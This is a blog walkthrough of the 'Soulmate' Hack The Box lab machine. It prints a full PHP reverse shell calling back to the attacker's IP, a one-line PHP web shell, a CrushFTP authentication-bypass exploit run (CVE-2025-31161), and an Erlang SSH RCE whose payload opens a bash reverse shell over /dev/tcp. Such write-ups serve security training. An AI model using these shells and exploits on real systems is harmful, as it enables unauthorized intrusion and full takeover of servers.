---
title: "Soulmate"
date: 2025-09-09
slug: "soulmate"
tags: ["Unrated", "HTB", "Unknown-OS"]
difficulty: "Unrated"
platform: "HTB"
os: "Unknown-OS"
cover: "/images/soulmate/Pasted image 20250907185422.png"
summary: "Walkthrough of the Soulmate HTB machine covering recon, exploitation, and privilege escalation."
---
## Recon

```shell
nmap 10.129.131.166
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-07 18:49 EEST
Nmap scan report for 10.129.131.166
Host is up (0.30s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 2.35 seconds

```

Further recon

```shell
nmap -sV -p 22,80 -sC 10.129.131.166 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-07 18:49 EEST
Nmap scan report for 10.129.131.166
Host is up (0.090s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soulmate.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.26 seconds

```

now I have to add the machine virtual domain to /etc/hosts

```shell
nmap -sV -p 22,80 -sC 10.129.131.166
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-07 18:51 EEST
Nmap scan report for soulmate.htb (10.129.131.166)
Host is up (0.090s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Soulmate - Find Your Perfect Match
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.56 seconds

```

## Web

Registering an account

![soulmate-1](/images/soulmate/Pasted image 20250907185422.png)

Since there is upload

![soulmate-2](/images/soulmate/Pasted image 20250907185519.png)

I will try upload a web shell in php

```shell
cat simple-webshell.php             
<?php system($_GET["cmd"]); ?>

```

got 200 okay, I will try a php reverse shell maybe it works if not then the application is not accepting the files and simply returning 200 ok

```shell
 cat > revshell1.php    
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.16.46';
$port = 9001;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
        $pid = pcntl_fork();

        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if ($pid) {
                exit(0);  // Parent exits
        }
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }

        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }

        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }

        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}

?>
^C

```

and I will upload it and open netcat listener and also load profile.php to see if the file is executed

didnt work as expected so I will try GIF and png magic bytes and still didn;t work as there was no shell opened

![soulmate-3](/images/soulmate/Pasted image 20250907192539.png)

with gif magic bytes

![soulmate-4](/images/soulmate/Pasted image 20250907192604.png)

both didn't work when loading the image, let me upload a normal image and see if it works

even a legitimate png did not appear in the profile photo so I will perform directory busting and check for uploads directory

```shell
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://soulmate.htb/FUZZ -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://soulmate.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 16688, Words: 6110, Lines: 306, Duration: 132ms]
assets                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 74ms]
                        [Status: 200, Size: 16688, Words: 6110, Lines: 306, Duration: 75ms]

```

let's dig deeper

```shell
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://soulmate.htb/assets/FUZZ -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://soulmate.htb/assets/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 107ms]
images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 117ms]
css                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 175ms]

```

and further

```shell
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://soulmate.htb/assets/images/FUZZ -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://soulmate.htb/assets/images/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 122ms]
profiles                [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 156ms]
[WARN] Caught keyboard interrupt (Ctrl-C)

```

I get 403 forbidden when visiting /assets/images/profiles

let me try VHOST fuzzing to determine the subdomains

```shell
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://soulmate.htb/ -H 'Host: FUZZ.soulmate.htb' -fs 154 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://soulmate.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.soulmate.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

ftp                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 3521ms]
[WARN] Caught keyboard interrupt (Ctrl-C)

```

turns out it is a crushftp page

![soulmate-5](/images/soulmate/Pasted image 20250907202433.png)

in the page source there is a lot of instances of the version:

```html
|   |
|---|
|navigator.serviceWorker|
|.register("/WebInterface/new-ui/sw.js?v=11.W.657-2025_03_08_07_52")|
|.then((e) => {|
|console.log(e);|
|})|
|.catch((error) => {|
|console.log(error);|
|});|
```

which makes us assume that the crushftp release installed is on 8/03/2025 making it vulnerable to **CVE-2025-31161** as the patch was released in March 21

```shell
searchsploit crush                     
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Crush FTP 5 - 'APPE' Remote JVM Blue Screen of Death (PoC)                                                                                                                                                | windows/dos/17795.py
CrushFTP 11.3.1 - Authentication Bypass                                                                                                                                                                   | multiple/remote/52295.py
CrushFTP 7.2.0 - Multiple Vulnerabilities                                                                                                                                                                 | multiple/webapps/36126.txt
CrushFTP < 11.1.0 - Directory Traversal                                                                                                                                                                   | multiple/remote/52012.py
Tomabo MP4 Converter 3.10.12 < 3.11.12 - '.m3u' File Crush Application (Denial of Service)                                                                                                                | windows_x86/dos/38444.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

I will use 52295 script:

```shell
sudo cp /usr/share/exploitdb/exploits/multiple/remote/52295.py rce.py 
```

```shell
python rce.py --target ftp.soulmate.htb --check --port 80                                          

[36m
  / ____/______  _______/ /_  / ____/ /_____
 / /   / ___/ / / / ___/ __ \/ /_  / __/ __ \
/ /___/ /  / /_/ (__  ) / / / __/ / /_/ /_/ /
\____/_/   \__,_/____/_/ /_/_/    \__/ .___/
                                    /_/
[32mCVE-2025-31161 Exploit 2.0.0[33m | [36m Developer @ibrahimsql
[0m

Scanning 1 targets with 10 threads...
Scanning targets... ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% (1/1) 0:00:00

Scan complete! Found 1 vulnerable targets.

Summary:
Total targets: 1
Vulnerable targets: 1
Exploited targets: 0

```

```shell
python rce.py --target ftp.soulmate.htb --port 80 --exploit --new-user admin --password Password123

[36m
  / ____/______  _______/ /_  / ____/ /_____
 / /   / ___/ / / / ___/ __ \/ /_  / __/ __ \
/ /___/ /  / /_/ (__  ) / / / __/ / /_/ /_/ /
\____/_/   \__,_/____/_/ /_/_/    \__/ .___/
                                    /_/
[32mCVE-2025-31161 Exploit 2.0.0[33m | [36m Developer @ibrahimsql
[0m

Exploiting 1 targets with 10 threads...
[+] Successfully created user admin on ftp.soulmate.htb
Exploiting targets... ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% (1/1) 0:00:00

Exploitation complete! Successfully exploited 1/1 targets.

Exploited Targets:
→ ftp.soulmate.htb

Summary:
Total targets: 1
Vulnerable targets: 0
Exploited targets: 1

```


and successfully logged in with admin permissions

![soulmate-6](/images/soulmate/Pasted image 20250907204738.png)

Will check administration page

![soulmate-7](/images/soulmate/Pasted image 20250907205835.png)

Deep dive on the CVE and its POC : https://projectdiscovery.io/blog/crushftp-authentication-bypass#nuclei-template-for-detection

Tried all functionalities, the most promising is user manager

![soulmate-8](/images/soulmate/Pasted image 20250908093105.png)

Tried changing the password but still couldn't ssh into the user:

![soulmate-9](/images/soulmate/Pasted image 20250908094414.png)

```shell
ssh ben@ftp.soulmate.htb
ben@ftp.soulmate.htb's password: 
Permission denied, please try again.
ben@ftp.soulmate.htb's password: 

```

The trick is in changing crushadmin password and then logging into their account

do this:

![soulmate-10](/images/soulmate/Pasted image 20250908103356.png)


Uploaded revshell1.php

but didn't run only linked to it

so I will upload in /assets/images/profiles/

![soulmate-11](/images/soulmate/Pasted image 20250908102007.png)

and I will access the link: `soulmate.htb/assets/images/profiles/revshell1.php`

and so we have a shelllllllll


```shell
 nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.16.46] from (UNKNOWN) [10.129.10.2] 34382
Linux soulmate 5.15.0-153-generic #163-Ubuntu SMP Thu Aug 7 16:37:18 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 07:19:25 up 52 min,  0 users,  load average: 0.00, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ 

```

## Gaining User flag

```shell
ss -tuln
Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess
udp   UNCONN 0      0      127.0.0.53%lo:53         0.0.0.0:*          
udp   UNCONN 0      0            0.0.0.0:68         0.0.0.0:*          
tcp   LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:8080       0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:45523      0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:4369       0.0.0.0:*          
tcp   LISTEN 0      5          127.0.0.1:2222       0.0.0.0:*          
tcp   LISTEN 0      128        127.0.0.1:43175      0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:8443       0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:9090       0.0.0.0:*          
tcp   LISTEN 0      511          0.0.0.0:80         0.0.0.0:*          
tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*          
tcp   LISTEN 0      4096           [::1]:4369          [::]:*          
tcp   LISTEN 0      511             [::]:80            [::]:*          
tcp   LISTEN 0      128             [::]:22            [::]:*       
```

there is something running on port 2222

there is python so I will upgrade my shell

```shell
python3 -h
usage: python3 [option] ... [-c cmd | -m mod | file | -] [arg] ...
Options and arguments (and corresponding environment variables):
-b     : issue warnings about str(bytes_instance), str(bytearray_instance)
         and comparing bytes/bytearray with str. (-bb: issue errors)
-B     : don't write .pyc files on import; also PYTHONDONTWRITEBYTECODE=x
-c cmd : program passed in as string (terminates option list)
-d     : turn on parser debugging output (for experts only, only works on
         debug builds); also PYTHONDEBUG=x
-E     : ignore PYTHON* environment variables (such as PYTHONPATH)
-h     : print this help message and exit (also -? or --help)
-i     : inspect interactively after running script; forces a prompt even

```


```shell
$ cd
cd
$ ls
ls
html  soulmate.htb
$ ls -la
ls -la
total 16
drwxr-xr-x  4 root root 4096 Aug 27 09:24 .
drwxr-xr-x 13 root root 4096 Sep  2 10:19 ..
drwxr-xr-x  2 root root 4096 Aug 27 09:25 html
drwxr-xr-x  6 root root 4096 Aug 10 10:39 soulmate.htb
$ ls -R
ls -R
.:
html  soulmate.htb

./html:
index.nginx-debian.html

./soulmate.htb:
config  data  public  src

./soulmate.htb/config:
config.php

./soulmate.htb/data:
soulmate.db

./soulmate.htb/public:
assets         index.php  logout.php   register.php
dashboard.php  login.php  profile.php

./soulmate.htb/public/assets:
css  images

./soulmate.htb/public/assets/css:
style.css

./soulmate.htb/public/assets/images:
profiles

./soulmate.htb/public/assets/images/profiles:
1.php

./soulmate.htb/src:
Models

./soulmate.htb/src/Models:
User.php
$ cat soulmate.htb/config/config.php
cat soulmate.htb/config/config.php
<?php
class Database {
    private $db_file = '../data/soulmate.db';
    private $pdo;

    public function __construct() {
        $this->connect();
        $this->createTables();
    }

    private function connect() {
        try {
            // Create data directory if it doesn't exist
            $dataDir = dirname($this->db_file);
            if (!is_dir($dataDir)) {
                mkdir($dataDir, 0755, true);
            }

            $this->pdo = new PDO('sqlite:' . $this->db_file);
            $this->pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
            $this->pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
        } catch (PDOException $e) {
            die("Connection failed: " . $e->getMessage());
        }
    }

    private function createTables() {
        $sql = "
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password TEXT NOT NULL,
            is_admin INTEGER DEFAULT 0,
            name TEXT,
            bio TEXT,
            interests TEXT,
            phone TEXT,
            profile_pic TEXT,
            last_login DATETIME,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )";

        $this->pdo->exec($sql);

        // Create default admin user if not exists
        $adminCheck = $this->pdo->prepare("SELECT COUNT(*) FROM users WHERE username = ?");
        $adminCheck->execute(['admin']);
        
        if ($adminCheck->fetchColumn() == 0) {
            $adminPassword = password_hash('Crush4dmin990', PASSWORD_DEFAULT);
            $adminInsert = $this->pdo->prepare("
                INSERT INTO users (username, password, is_admin, name) 
                VALUES (?, ?, 1, 'Administrator')
            ");
            $adminInsert->execute(['admin', $adminPassword]);
        }
    }

    public function getConnection() {
        return $this->pdo;
    }
}

// Helper functions
function redirect($path) {
    header("Location: $path");
    exit();
}

function isLoggedIn() {
    return isset($_SESSION['user_id']);
}

function isAdmin() {
    return isset($_SESSION['is_admin']) && $_SESSION['is_admin'] == 1;
}

function requireLogin() {
    if (!isLoggedIn()) {
        redirect('/login');
    }
}

function requireAdmin() {
    requireLogin();
    if (!isAdmin()) {
        redirect('/profile');
    }
}
?>
$ 

```

then:

```shell
$ cd    
$ cd soulmate.htb
$ cd data
$ ls
soulmate.db
$ sqlite3 soulmate.db
.databases
main: /var/www/soulmate.htb/data/soulmate.db r/w
.tables
users
SELECT * FROM users;
1|admin|$2y$12$u0AC6fpQu0MJt7uJ80tM.Oh4lEmCMgvBs3PwNNZIR7lor05ING3v2|1|Administrator|||||2025-08-10 13:00:08|2025-08-10 12:59:39
```

I think the password is that from the config so no need to do anything

I will run linpeas, checking the services

```shell
Services and Service Files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#services                                                                                                                                                  
                                                                                                                                                                                                                                            
══╣ Active services:
apparmor.service                   loaded active exited  Load AppArmor profiles                                                                                                                                                             
apport.service                     loaded active exited  LSB: automatic crash report generation
auditd.service                     loaded active running Security Auditing Service
blk-availability.service           loaded active exited  Availability of block devices
console-setup.service              loaded active exited  Set console font and keymap
containerd.service                 loaded active running containerd container runtime
cron.service                       loaded active running Regular background program processing daemon
crushftp.service                   loaded active running CrushFTP service
  Potential issue in service: crushftp.service
  └─ RUNS_AS_ROOT: Service runs as root\n
dbus.service                       loaded active running D-Bus System Message Bus
  Potential issue in service file: /lib/systemd/system/dbus.service
  └─ RELATIVE_PATH: Could be executing some relative path\n
docker.service                     loaded active running Docker Application Container Engine
epmd-local.service                 loaded active running Erlang Port Mapper Daemon
erlang_ssh.service                 loaded active running Start Erlang SSH Service
  Potential issue in service: erlang_ssh.service
  └─ RUNS_AS_ROOT: Service runs as root\n
finalrd.service                    loaded active exited  Create final runtime dir for shutdown pivot root
getty@tty1.service                 loaded active running Getty on tty1
ifup@eth0.service                  loaded active exited  ifup for eth0
  Potential issue in service file: /lib/systemd/system/ifup@.service
  └─ RELATIVE_PATH: Could be executing some relative path\n
ifupdown-pre.service               loaded active exited  Helper to synchronize boot up for ifupdown
  Potential issue in service file: /lib/systemd/system/ifupdown-pre.service
  └─ RELATIVE_PATH: Could be executing some relative path\n
irqbalance.service                 loaded active running irqbalance daemon
keyboard-setup.service             loaded active exited  Set the console keyboard layout
kmod-static-nodes.service          loaded active exited  Create List of Static Device Nodes
lvm2-monitor.service               loaded active exited  Monitoring of LVM2 mirrors, snapshots etc. using dmeventd or progress polling
ModemManager.service               loaded active running Modem Manager
  Potential issue in service: ModemManager.service
  └─ RUNS_AS_ROOT: Service runs as root\n
multipathd.service                 loaded active running Device-Mapper Multipath Device Controller
networkd-dispatcher.service        loaded active running Dispatcher daemon for systemd-networkd
networking.service                 loaded active exited  Raise network interfaces
nginx.service                      loaded active running A high performance web server and a reverse proxy server
open-vm-tools.service              loaded active running Service for virtual machines hosted on VMware
php8.1-fpm.service                 loaded active running The PHP 8.1 FastCGI Process Manager
plymouth-quit-wait.service         loaded active exited  Hold until boot process finishes up
plymouth-quit.service              loaded active exited  Terminate Plymouth Boot Screen
plymouth-read-write.service        loaded active exited  Tell Plymouth To Write Out Runtime Data
polkit.service                     loaded active running Authorization Manager
rsyslog.service                    loaded active running System Logging Service
setvtrgb.service                   loaded active exited  Set console scheme
ssh.service                        loaded active running OpenBSD Secure Shell server
systemd-binfmt.service             loaded active exited  Set Up Additional Binary Formats
systemd-journal-flush.service      loaded active exited  Flush Journal to Persistent Storage
  Potential issue in service file: /lib/systemd/system/systemd-journal-flush.service
  └─ RELATIVE_PATH: Could be executing some relative path\n
systemd-journald.service           loaded active running Journal Service
systemd-logind.service             loaded active running User Login Management
systemd-modules-load.service       loaded active exited  Load Kernel Modules
systemd-random-seed.service        loaded active exited  Load/Save Random Seed
systemd-remount-fs.service         loaded active exited  Remount Root and Kernel File Systems
  Potential issue in service: systemd-remount-fs.service
  └─ UNSAFE_CMD: Uses potentially dangerous commands\n
systemd-resolved.service           loaded active running Network Name Resolution
systemd-sysctl.service             loaded active exited  Apply Kernel Variables
systemd-sysusers.service           loaded active exited  Create System Users
  Potential issue in service file: /lib/systemd/system/systemd-sysusers.service
  └─ RELATIVE_PATH: Could be executing some relative path\n
  Potential issue in service: systemd-sysusers.service
  └─ UNSAFE_CMD: Uses potentially dangerous commands\n
systemd-timesyncd.service          loaded active running Network Time Synchronization
systemd-tmpfiles-setup-dev.service loaded active exited  Create Static Device Nodes in /dev
systemd-tmpfiles-setup.service     loaded active exited  Create Volatile Files and Directories
systemd-udev-trigger.service       loaded active exited  Coldplug All udev Devices
  Potential issue in service file: /lib/systemd/system/systemd-udev-trigger.service
  └─ RELATIVE_PATH: Could be executing some relative path\n
  Potential issue in service: systemd-udev-trigger.service
  └─ UNSAFE_CMD: Uses potentially dangerous commands\n
systemd-udevd.service              loaded active running Rule-based Manager for Device Events and Files
  Potential issue in service file: /lib/systemd/system/systemd-udevd.service
  └─ RELATIVE_PATH: Could be executing some relative path\n
systemd-update-utmp.service        loaded active exited  Record System Boot/Shutdown in UTMP
systemd-user-sessions.service      loaded active exited  Permit User Sessions
ubuntu-fan.service                 loaded active exited  Ubuntu FAN network setup
udisks2.service                    loaded active running Disk Manager
upower.service                     loaded active running Daemon for power management
vgauth.service                     loaded active running Authentication service for virtual machines hosted on VMware
LOAD   = Reflects whether the unit definition was properly loaded.
ACTIVE = The high-level unit activation state, i.e. generalization of SUB.
SUB    = The low-level unit activation state, values depend on unit type.
55 loaded units listed.

```


and this looked promising

```shell
root        1147  0.0  0.0   7140   224 ?        S    06:26   0:00 /usr/bin/epmd -daemon -address 127.0.0.1

```

continuing with linpeas logs specifically for epmd service:

```shell
2025-08-06+10:44:11.7097572460 /usr/local/lib/erlang/erts-15.2.5/bin/epmd

```

```shell
which epmd
which epmd
/usr/local/bin/epmd
www-data@soulmate:/dev/shm$ epmd -h
epmd -h
usage: epmd [-d|-debug] [DbgExtra...] [-address List]
            [-port No] [-daemon] [-relaxed_command_check]
       epmd [-d|-debug] [-port No] [-names|-kill|-stop name]

See the Erlang epmd manual page for info about the usage.

Regular options
    -address List
        Let epmd listen only on the comma-separated list of IP
        addresses (and on the loopback interface).
    -port No
        Let epmd listen to another port than default 4369
    -d
    -debug
        Enable debugging. This will give a log to
        the standard error stream. It will shorten
        the number of saved used node names to 5.

        If you give more than one debug flag you may
        get more debugging information.
    -daemon
        Start epmd detached (as a daemon)
    -relaxed_command_check
        Allow this instance of epmd to be killed with
        epmd -kill even if there are registered nodes.
        Also allows forced unregister (epmd -stop).

DbgExtra options
    -packet_timeout Seconds
        Set the number of seconds a connection can be
        inactive before epmd times out and closes the
        connection (default 60).

    -delay_accept Seconds
        To simulate a busy server you can insert a
        delay between epmd gets notified about that
        a new connection is requested and when the
        connections gets accepted.

    -delay_write Seconds
        Also a simulation of a busy server. Inserts
        a delay before a reply is sent.

Interactive options
    -names
        List names registered with the currently running epmd
    -kill
        Kill the currently running epmd
        (only allowed if -names show empty database or
        -relaxed_command_check was given when epmd was started).
    -stop Name
        Forcibly unregisters a name with epmd
        (only allowed if -relaxed_command_check was given when 
        epmd was started).

```

since epmd is downloaded then there is erlang is definitely installed on the machine

```shell
www-data@soulmate:/dev/shm$ erl
erl
Erlang/OTP 27 [erts-15.2.5] [source] [64-bit] [smp:2:2] [ds:2:2:10] [async-threads:1] [jit:ns]

Eshell V15.2.5 (press Ctrl+G to abort, type help(). for help)
1> ^G
^G

User switch command (type h for help)
 --> exit
exit
exit

Unknown command
 --> ^C

```

for erlang version 15.2.5 ths CVE is most promising CVE-2025-32433
will use this: https://github.com/0xPThree/cve-2025-32433/tree/main


Now execute:

```shell
cd /dev/shm
cd /dev/shm
www-data@soulmate:/dev/shm$ wget http://10.10.16.46:8999/poc.py
wget http://10.10.16.46:8999/poc.py
--2025-09-08 19:06:52--  http://10.10.16.46:8999/poc.py
Connecting to 10.10.16.46:8999... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3840 (3.8K) [text/x-python]
Saving to: ‘poc.py’

poc.py              100%[===================>]   3.75K  --.-KB/s    in 0.002s  

2025-09-08 19:06:52 (1.76 MB/s) - ‘poc.py’ saved [3840/3840]

www-data@soulmate:/dev/shm$ python3 poc.py 
python3 poc.py 
[*] Connecting to SSH server...
[✓] Banner: SSH-2.0-Erlang/5.2.9
[*] Sending KEXINIT...
[*] Opening channel...
[?] Shell command: bash -i >& /dev/tcp/10.10.16.46/12345 0>&1  
bash -i >& /dev/tcp/10.10.16.46/12345 0>&1
[*] Sending CHANNEL_REQUEST...
[✓] Payload sent.
www-data@soulmate:/dev/shm$ 

```


Now we have root:

```shell
nc -nlvp 12345 
listening on [any] 12345 ...
connect to [10.10.16.46] from (UNKNOWN) [10.129.131.120] 53348
bash: cannot set terminal process group (2111): Inappropriate ioctl for device
bash: no job control in this shell
root@soulmate:/# whoami
whoami
root
root@soulmate:/# 

```

the flags

user:

```shell
cat /home/ben/user.txt
cat /home/ben/user.txt
b6981be3025cfe87ff441ad554e674dc
root@soulmate:/# 

```

root:

```shell
/# cat /root/root.txt
cat /root/root.txt
8ed84810ff5ed9dce46b33613b7aea01
root@soulmate:/# 

```

Resources: 
- CrushFTP CVE: https://projectdiscovery.io/blog/crushftp-authentication-bypass#nuclei-template-for-detection
- Erlang RCE: https://www.offsec.com/blog/cve-2025-32433/
